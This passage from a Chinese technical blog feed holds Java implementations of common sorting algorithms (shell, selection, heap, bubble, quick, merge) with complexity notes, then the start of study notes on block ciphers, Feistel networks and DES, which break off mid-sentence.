class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ShellSort</span> </span>&#123;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</div><div class="line"><span class="comment">//给出无序数组</span></div><div class="line"><span class="keyword">int</span> arr[] = &#123;<span class="number">72</span>,<span class="number">6</span>,<span class="number">57</span>,<span class="number">88</span>,<span class="number">60</span>,<span class="number">42</span>,<span class="number">83</span>,<span class="number">73</span>,<span class="number">48</span>,<span class="number">85</span>&#125;;</div><div class="line"><span class="comment">//输出无序数组</span></div><div class="line">System.out.println(Arrays.toString(arr));</div><div class="line"><span class="comment">//希尔排序</span></div><div class="line">shellSort(arr);</div><div class="line"><span class="comment">//输出有序数组</span></div><div class="line">System.out.println(Arrays.toString(arr));</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">shellSort</span><span class="params">(<span class="keyword">int</span>[] arr)</span> </span>&#123;</div><div class="line"><span class="comment">//设置步长</span></div><div class="line"><span class="keyword">int</span> gap = arr.length/<span class="number">2</span>; </div><div class="line"><span class="keyword">while</span>(gap&gt;<span class="number">0</span>) &#123;</div><div class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=gap; j&lt;arr.length; j++) &#123;</div><div class="line"><span class="keyword">int</span> i=j;</div><div class="line"><span class="comment">//插入排序</span></div><div class="line"><span class="keyword">while</span>(i&gt;=gap &amp;&amp; arr[i-gap]&gt;arr[i]) &#123;</div><div class="line"><span class="keyword">int</span> temp = arr[i-gap];</div><div class="line">arr[i-gap] = arr[i];</div><div class="line">arr[i] = temp;</div><div class="line">i -= gap;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">gap = gap/<span class="number">2</span>;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h3 id="选择排序"><a href="#选择排序" class="headerlink" title="选择排序"></a>选择排序</h3><h4 id="直接选择"><a href="#直接选择" class="headerlink" title="直接选择"></a>直接选择</h4><p><img src="/images/sort/selection_sort.gif" alt="selection_sort"></p><ul><li>选择排序(不稳定)</li><li>不断地选择剩余元素中的最小者</li><li>时间复杂度O(n^2)</li><li>空间复杂度O(1)</li><li>代码实现：</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SelectionSort</span> </span>&#123;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</div><div class="line"><span class="comment">//给出无序数组</span></div><div class="line"><span class="keyword">int</span> arr[] = &#123;<span class="number">72</span>,<span class="number">6</span>,<span class="number">57</span>,<span class="number">88</span>,<span class="number">60</span>,<span class="number">42</span>,<span class="number">83</span>,<span class="number">73</span>,<span class="number">48</span>,<span class="number">85</span>&#125;;</div><div class="line"><span class="comment">//输出无序数组</span></div><div class="line">System.out.println(Arrays.toString(arr));</div><div class="line"><span class="comment">//选择排序</span></div><div class="line">selectionSort(arr);</div><div class="line"><span class="comment">//输出有序数组</span></div><div class="line">System.out.println(Arrays.toString(arr));</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">selectionSort</span><span class="params">(<span class="keyword">int</span>[] arr)</span> </span>&#123;</div><div class="line"></div><div class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;arr.length; i++) &#123;</div><div class="line"><span class="keyword">int</span> min_index = i;</div><div class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=i+<span class="number">1</span>; j&lt;arr.length; j++) &#123;</div><div class="line"><span class="keyword">if</span>(arr[j] &lt; arr[min_index]) &#123;</div><div class="line">min_index = j;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"><span class="keyword">int</span> temp = arr[min_index];</div><div class="line">arr[min_index] = arr[i];</div><div class="line">arr[i] = temp;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure><h4 id="堆排序"><a href="#堆排序" class="headerlink" title="堆排序"></a>堆排序</h4><p><img src="/images/sort/heapSort.gif" alt="heapSort"></p><ul><li>堆排序(不稳定)</li><li>时间复杂度 O(nlogn)</li><li>空间复杂度O(1)</li><li>代码实现：</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HeapSort</span> </span>&#123;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</div><div class="line"><span class="comment">//给出无序数组</span></div><div class="line"><span class="keyword">int</span> arr[] = &#123;<span class="number">72</span>,<span class="number">6</span>,<span class="number">57</span>,<span class="number">88</span>,<span class="number">60</span>,<span class="number">42</span>,<span class="number">83</span>,<span class="number">73</span>,<span class="number">48</span>,<span class="number">85</span>&#125;;</div><div class="line"><span class="comment">//输出无序数组</span></div><div class="line">System.out.println(Arrays.toString(arr));</div><div class="line"><span class="comment">//堆排序</span></div><div class="line">heapSort(arr);</div><div class="line"><span class="comment">//输出有序数组</span></div><div class="line">System.out.println(Arrays.toString(arr));</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">heapSort</span><span class="params">(<span class="keyword">int</span>[] arr)</span> </span>&#123;</div><div class="line">        <span class="keyword">int</span> len = arr.length -<span class="number">1</span>;</div><div class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = len/<span class="number">2</span> - <span class="number">1</span>; i &gt;=<span class="number">0</span>; i --)&#123; <span class="comment">//堆构造</span></div><div class="line">            heapAdjust(arr,i,len);</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">while</span> (len &gt;=<span class="number">0</span>)&#123;</div><div class="line">        <span class="comment">//将堆顶元素与尾节点交换后，长度减1，尾元素最大</span></div><div class="line">            swap(arr,<span class="number">0</span>,len--);    </div><div class="line">            <span class="comment">//再次对堆进行调整</span></div><div class="line">            heapAdjust(arr,<span class="number">0</span>,len);    </div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"> </div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">heapAdjust</span><span class="params">(<span class="keyword">int</span>[] arr,<span class="keyword">int</span> i,<span class="keyword">int</span> len)</span></span>&#123;</div><div class="line">    <span class="keyword">int</span> left,right,j ;</div><div class="line">    <span class="keyword">while</span>((left = <span class="number">2</span>*i+<span class="number">1</span>) &lt;= len)&#123;    <span class="comment">//判断当前父节点有无左节点（即有无孩子节点，left为左节点）</span></div><div class="line">    right = left + <span class="number">1</span>;  <span class="comment">//右节点</span></div><div class="line">    j = left;   <span class="comment">//j"指针指向左节点"</span></div><div class="line">    <span class="comment">//右节点大于左节点</span></div><div class="line">    <span class="keyword">if</span>(j &lt; len &amp;&amp; arr[left] &lt; arr[right])    </div><div class="line">    <span class="comment">//当前把"指针"指向右节点</span></div><div class="line">    j ++;     </div><div class="line">    <span class="comment">//将父节点与孩子节点交换（如果上面if为真，则arr[j]为右节点，如果为假arr[j]则为左节点）</span></div><div class="line">    <span class="keyword">if</span>(arr[i] &lt; arr[j])    </div><div class="line">    swap(arr,i,j);</div><div class="line">    <span class="comment">//说明比孩子节点都大，直接跳出循环语句</span></div><div class="line">    <span class="keyword">else</span>         </div><div class="line">    <span class="keyword">break</span>;</div><div class="line">    i = j;</div><div class="line">    &#125;</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">swap</span><span class="params">(<span class="keyword">int</span>[] arr,<span class="keyword">int</span> i,<span class="keyword">int</span> len)</span></span>&#123;</div><div class="line">             </div><div class="line">    <span class="keyword">int</span> temp = arr[i];</div><div class="line">        arr[i] = arr[len];</div><div class="line">        arr[len] = temp;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure><h3 id="交换排序"><a href="#交换排序" class="headerlink" title="交换排序"></a>交换排序</h3><h4 id="冒泡排序"><a href="#冒泡排序" class="headerlink" title="冒泡排序"></a>冒泡排序</h4><p><img src="/images/sort/bubble_sort.gif" alt="bubble_sort"></p><ul><li>冒泡排序(稳定)</li><li>时间复杂度O(n^2)</li><li>空间复杂度O(1)</li><li>代码实现：</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestBubbleSort</span> </span>&#123;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</div><div class="line"><span class="comment">//给出无序数组</span></div><div class="line"><span class="keyword">int</span> arr[] = &#123;<span class="number">72</span>,<span class="number">6</span>,<span class="number">57</span>,<span class="number">88</span>,<span class="number">60</span>,<span class="number">42</span>,<span class="number">83</span>,<span class="number">73</span>,<span class="number">48</span>,<span class="number">85</span>&#125;;</div><div class="line"><span class="comment">//输出无序数组</span></div><div class="line">System.out.println(Arrays.toString(arr));</div><div class="line"><span class="comment">//冒泡排序</span></div><div class="line">bubbleSort(arr);</div><div class="line"><span class="comment">//输出有序数组</span></div><div class="line">System.out.println(Arrays.toString(arr));</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">bubbleSort</span><span class="params">(<span class="keyword">int</span>[] arr)</span> </span>&#123;</div><div class="line"></div><div class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;arr.length; i++) &#123;</div><div class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>; j&lt;arr.length-i; j++) &#123;</div><div class="line"><span class="keyword">if</span>(arr[j-<span class="number">1</span>]&gt;arr[j]) &#123;</div><div class="line"><span class="keyword">int</span> temp = arr[j-<span class="number">1</span>];</div><div class="line">arr[j-<span class="number">1</span>] = arr[j];</div><div class="line">arr[j] = temp;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure><h4 id="快速排序"><a href="#快速排序" class="headerlink" title="快速排序"></a>快速排序</h4><p><img src="/images/sort/Quicksort-example.gif" alt="Quicksort-example"></p><ul><li>快排 = 冒泡 + 分治 + 递归</li><li>时间复杂度 O(nlogn)</li><li>空间复杂度O(logn)</li></ul><ul><li>代码实现：</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestQuickSort</span> </span>&#123;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">partition</span><span class="params">(<span class="keyword">int</span>[] arr, <span class="keyword">int</span> low, <span class="keyword">int</span> high)</span> </span>&#123;</div><div class="line"><span class="comment">//指定左指针i和右指针j</span></div><div class="line"><span class="keyword">int</span> i = low;</div><div class="line"><span class="keyword">int</span> j = high;</div><div class="line"><span class="comment">//将第一个数作为基准值，挖坑</span></div><div class="line"><span class="keyword">int</span> x = arr[low];</div><div class="line"><span class="comment">//使用循环实现分区操作</span></div><div class="line"><span class="keyword">while</span>(i&lt;j) &#123;</div><div class="line"><span class="comment">//1. 从右向左移动j, 找到第一个小于基准值的值</span></div><div class="line"><span class="keyword">while</span>(arr[j] &gt;= x &amp;&amp; i&lt;j) &#123;</div><div class="line">j--;</div><div class="line">&#125;</div><div class="line"><span class="comment">//2. 将找到的数填入i的(坑)位置, i++</span></div><div class="line"><span class="keyword">if</span>(i&lt;j) &#123;</div><div class="line">arr[i] = arr[j];</div><div class="line">i++;</div><div class="line">&#125;</div><div class="line"><span class="comment">//3. 从左向右移动i, 找到第一个大于等于基准值的值</span></div><div class="line"><span class="keyword">while</span>(arr[i] &lt;= x &amp;&amp; i&lt;j) &#123;</div><div class="line">i++;</div><div class="line">&#125;</div><div class="line"><span class="comment">//4. 将找到的数填入j的位置, j--</span></div><div class="line"><span class="keyword">if</span>(i&lt;j) &#123;</div><div class="line">arr[j] = arr[i];</div><div class="line">j--;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"><span class="comment">//使用基准值填坑，此即基准值的最终位置</span></div><div class="line">arr[i] = x; <span class="comment">// arr[j] = x;</span></div><div class="line"><span class="comment">//返回基准值的位置索引</span></div><div class="line"><span class="keyword">return</span> i;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">quickSort</span><span class="params">(<span class="keyword">int</span>[] arr, <span class="keyword">int</span> low, <span class="keyword">int</span> high)</span> </span>&#123;</div><div class="line"><span class="keyword">if</span>(low &lt; high) &#123;<span class="comment">//递归结束条件</span></div><div class="line"><span class="comment">//分区操作，将一个数组分成两个分区，返回分区界限索引</span></div><div class="line"><span class="keyword">int</span> index = partition(arr, low, high);</div><div class="line"><span class="comment">//对左分区进行快排</span></div><div class="line">quickSort(arr, low, index-<span class="number">1</span>);</div><div class="line"><span class="comment">//对右分区进行快排</span></div><div class="line">quickSort(arr, index+<span class="number">1</span>, high);</div><div class="line">&#125;</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">quickSort</span><span class="params">(<span class="keyword">int</span>[] arr)</span> </span>&#123;</div><div class="line"><span class="keyword">int</span> low = <span class="number">0</span>;</div><div class="line"><span class="keyword">int</span> high = arr.length - <span class="number">1</span>;</div><div class="line">quickSort(arr, low, high);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</div><div class="line"><span class="comment">//给出无序数组</span></div><div class="line"><span class="keyword">int</span> arr[] = &#123;<span class="number">72</span>,<span class="number">6</span>,<span class="number">57</span>,<span class="number">88</span>,<span class="number">60</span>,<span class="number">42</span>,<span class="number">83</span>,<span class="number">73</span>,<span class="number">48</span>,<span class="number">85</span>&#125;;</div><div class="line"><span class="comment">//输出无序数组</span></div><div class="line">System.out.println(Arrays.toString(arr));</div><div class="line"><span class="comment">//快速排序</span></div><div class="line">quickSort(arr);</div><div class="line"><span class="comment">//输出有序数组</span></div><div class="line">System.out.println(Arrays.toString(arr));</div><div class="line"></div><div class="line">&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h3 id="归并排序"><a href="#归并排序" class="headerlink" title="归并排序"></a>归并排序</h3><p><img src="/images/sort/mergeSort.gif" alt="mergeSort"></p><ul><li>归并排序(稳定)</li><li>递归 + 合并</li><li>时间复杂度 O(nlogn)</li><li>空间复杂度O(n) +O(logn)</li><li>代码实现：</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MergeSort</span> </span>&#123;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</div><div class="line"><span class="comment">//给出无序数组</span></div><div class="line"><span class="keyword">int</span> arr[] = &#123;<span class="number">72</span>,<span class="number">6</span>,<span class="number">57</span>,<span class="number">88</span>,<span class="number">60</span>,<span class="number">42</span>,<span class="number">83</span>,<span class="number">73</span>,<span class="number">48</span>,<span class="number">85</span>&#125;;</div><div class="line"><span class="comment">//输出无序数组</span></div><div class="line">System.out.println(Arrays.toString(arr));</div><div class="line"><span class="comment">//归并排序</span></div><div class="line">mergeSort(arr);</div><div class="line"><span class="comment">//输出有序数组</span></div><div class="line">System.out.println(Arrays.toString(arr));</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">mergeSort</span><span class="params">(<span class="keyword">int</span>[] arr)</span> </span>&#123;</div><div class="line"><span class="keyword">int</span> low = <span class="number">0</span>;</div><div class="line"><span class="keyword">int</span> high = arr.length - <span class="number">1</span>;</div><div class="line">mergeSort(arr, low, high);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">mergeSort</span><span class="params">(<span class="keyword">int</span>[] arr, <span class="keyword">int</span> low, <span class="keyword">int</span> high)</span> </span>&#123;</div><div class="line"></div><div class="line"><span class="keyword">if</span>(low&lt;high) &#123;</div><div class="line"><span class="keyword">int</span> mid = (low + high) / <span class="number">2</span>;</div><div class="line"><span class="comment">//对左边的数组进行递归排序</span></div><div class="line">mergeSort(arr, low, mid);</div><div class="line"><span class="comment">//对右边的数组进行递归排序</span></div><div class="line">mergeSort(arr, mid+<span class="number">1</span>, high);</div><div class="line"><span class="comment">//合并两个已排序的数组</span></div><div class="line">mergeArr(arr, low, mid, high);</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">mergeArr</span><span class="params">(<span class="keyword">int</span>[] arr, <span class="keyword">int</span> low, <span class="keyword">int</span> mid, <span class="keyword">int</span> high)</span> </span>&#123;</div><div class="line">        <span class="keyword">int</span>[] temp = <span class="keyword">new</span> <span class="keyword">int</span>[high - low + <span class="number">1</span>];</div><div class="line">        <span class="keyword">int</span> i = low;<span class="comment">// 左指针</span></div><div class="line">        <span class="keyword">int</span> j = mid + <span class="number">1</span>;<span class="comment">// 右指针</span></div><div class="line">        <span class="keyword">int</span> k = <span class="number">0</span>;</div><div class="line">        <span class="comment">// 把较小的数先移到新数组中</span></div><div class="line">        <span class="keyword">while</span> (i &lt;= mid &amp;&amp; j &lt;= high) &#123;</div><div class="line">            <span class="keyword">if</span> (arr[i] &lt; arr[j]) &#123;</div><div class="line">                temp[k++] = arr[i++];</div><div class="line">            &#125; <span class="keyword">else</span> &#123;</div><div class="line">                temp[k++] = arr[j++];</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="comment">// 把左边剩余的数移入数组</span></div><div class="line">        <span class="keyword">while</span> (i &lt;= mid) &#123;</div><div class="line">            temp[k++] = arr[i++];</div><div class="line">        &#125;</div><div class="line">        <span class="comment">// 把右边边剩余的数移入数组</span></div><div class="line">        <span class="keyword">while</span> (j &lt;= high) &#123;</div><div class="line">            temp[k++] = arr[j++];</div><div class="line">        &#125;</div><div class="line">        <span class="comment">// 把新数组中的数覆盖arr组</span></div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> k2 = <span class="number">0</span>; k2 &lt; temp.length; k2++) &#123;</div><div class="line">            arr[k2 + low] = temp[k2];</div><div class="line">        &#125;</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure><h3 id="对比"><a href="#对比" class="headerlink" title="对比"></a>对比</h3><p><img src="/images/sort/排序总结.jpg" alt="排序总结"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;插入排序&quot;&gt;&lt;a href=&quot;#插入排序&quot; class=&quot;headerlink&quot; title=&quot;插入排序&quot;&gt;&lt;/a&gt;插入排序&lt;/h3&gt;&lt;h4 id=&quot;直接插入&quot;&gt;&lt;a href=&quot;#直接插入&quot; class=&quot;headerlink&quot; title=&quot;直接插入&quot;&gt;&lt;/a
      
    
    </summary>
    
    
      <category term="算法" scheme="http://yoursite.com/tags/%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>密码学基础笔记(二)</title>
    <link href="http://yoursite.com/2019/01/26/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0(%E4%BA%8C)/"/>
    <id>http://yoursite.com/2019/01/26/密码学基础笔记(二)/</id>
    <published>2019-01-26T07:35:28.671Z</published>
    <updated>2019-02-21T10:09:02.156Z</updated>
    
    <content type="html"><![CDATA[<h2 id="第三章-分组密码和数据加密标准（DES）"><a href="#第三章-分组密码和数据加密标准（DES）" class="headerlink" title="第三章 分组密码和数据加密标准（DES）"></a>第三章 分组密码和数据加密标准（DES）</h2><h3 id="流密码与分组密码"><a href="#流密码与分组密码" class="headerlink" title="流密码与分组密码"></a>流密码与分组密码</h3><p><img src="/images/mima2/2-1.jpg" alt=""></p><p>分组密码：</p><blockquote><p>所谓分组密码是将明文分成一组一组，在密钥的控制下，经过加密变换生成一组一组的密文。</p><p>​       Step 1：将明文消息序列m1, m2, …, mi, …划分成等长的消息组（m1, …, mn），（mn+1, …, m2n），…</p><p>​       Step 2：在密钥k=k1, k2, …, kn的控制下按固定的加密算法一组一组进行加密。</p><p>​       Step 3：最后输出一组一组密文（c1, c2, …, cl），（cl+1, cl+2, …, c2l）。</p><p>在相同密钥下，分组密码对每组明文所进行的变换是一样的，因此只需要研究对单独一组明文进行加密变换。</p></blockquote><h3 id="Feistel密码"><a href="#Feistel密码" class="headerlink" title="Feistel密码"></a>Feistel密码</h3><p>Feistel建议使用乘积密码的概念来逼近理想分组密码。乘积密码是指依次使用两个或两个以上基本密码，所得结果的密码强度将强于所有单个密码的强度。</p><p><code>C=Enckn(...Enck2(Enck1(m))…)</code></p><p>Feistel密码：</p><ul><li><p>代替：每个明文元素或元素组被唯一地替换为相应的密文元素或元素组。</p></li><li><p>置换：明文元素的序列被替换为该序列的一个置换。也就是说，序列里没有元素被添加，删除或替换，但序列里出现的顺序改变了。</p></li><li>扩散：将明文的统计特性散布到密文中去，这可以通过让每个明文数字尽可能地影响多个密文数字。</li><li><p>混淆：使密文和密钥之间的统计关系尽可能复杂，以使敌手无法得到密钥。</p></li><li><p>分组长度: 分组越大则安全性越高，但加密速度就越慢。设计中最为普遍使用的是64比特。</p></li><li><p>密钥长度：密钥越长则安全性越高，但加密速度就越慢。现在普遍认为64比特或更短的密钥长度是不安全的，通常使用128比特的密钥长度。</p></li><li>迭代轮数：单轮结构远不足以保证安全性，但多轮结构可提供足够的安全性。典型地，轮数取为16。</li><li>子密钥产生算法：该算法的复杂性越大，则密码分析的困难性就越大。</li><li>轮函数F：轮函数的复杂性越大，密码分析的困难性也越大。</li><li>快速软件加/解密：许多情况下，算法是被镶嵌在应用程序中，因而无法用硬件实现。此时算法的执行速度是考虑的关键。</li><li>简化分析难度：如果算法能被无疑义地解释清楚，就可容易地分析算法抵抗攻击的能力，有助于设计高强度的算法。</li></ul><h3 id="数据加密标准（DES）"><a href="#数据加密标准（DES）" class="headerlink" title="数据加密标准（DES）"></a>数据加密标准（DES）</h3><p>在2001年高级加密标准（AES）提出前，DES一直是使用最广泛的加密方案。</p><ul><li><p>分组长度为64比特，密钥长度为56比特。</p></li><li><p>DES在1975年3月17日首次被公布在联邦记录中，经过大量的公开讨论后，DES于1977年1月15日被正式批准并作为美国联邦信息处理标准。</p></li><li><p>规定每隔5年由美国国家保密局作出评估，并重新批准它是否继续作为联邦加密标准。</p></li></ul><p>DES加密算法概述：</p><ul><li>DES的结构是典型的Feistel密码结构。</li><li>明文分组长度为64bit。</li><li>密文分组长度为64bit。</li><li>初始密钥长度为64bit。（其中，第8、16、24、32、40、48、56、64为奇偶校验位，因此，实际的密钥长为56bit。）</li></ul><p><img src="/images/mima2/2-2.jpg" alt=""></p><p>DES加密过程：</p><ol><li>初始置换IP：重排明文分组的64 bit数据。</li><li>具有相同功能的16轮迭代：每轮中都有置换和代换运算，第16轮变换的输出分为左右两半，并交换次序。</li><li>逆初始置换IP-1（IP的逆）：产生64 bit的密文。</li></ol><p>子密钥Ki的生成：</p><ol><li>初始密钥K为64 bit，首先置换选择PC1置换。</li><li>将置换后的56 bit分为各28 bit的左、右两半，分别记为C0和D0。在第i轮分别对Ci-1和Di-1进行循环左移，移位后的结果作为求下一轮子密钥的输入，同时也作为置换选择PC2的输入。</li><li>通过置换选择PC2产生的48 bit的Ki，即为i轮的子密钥，作为轮函数f (Ri-1, Ki)的输入。</li></ol><p>S盒代换：</p><p>DES算法中除了S盒是非线性变换外，其余变换均为线性变换，S盒是经过精心设计和严格挑选的。</p><p><strong>DES算法保密的关键在于S盒！</strong></p><p>DES的解密过程：</p><ul><li>DES的加密算法具有可逆性，解密64 bit密文消息分组使用与加密相同的算法，所不同的是子密钥顺序使用相反，依次为 K16, K15, …, 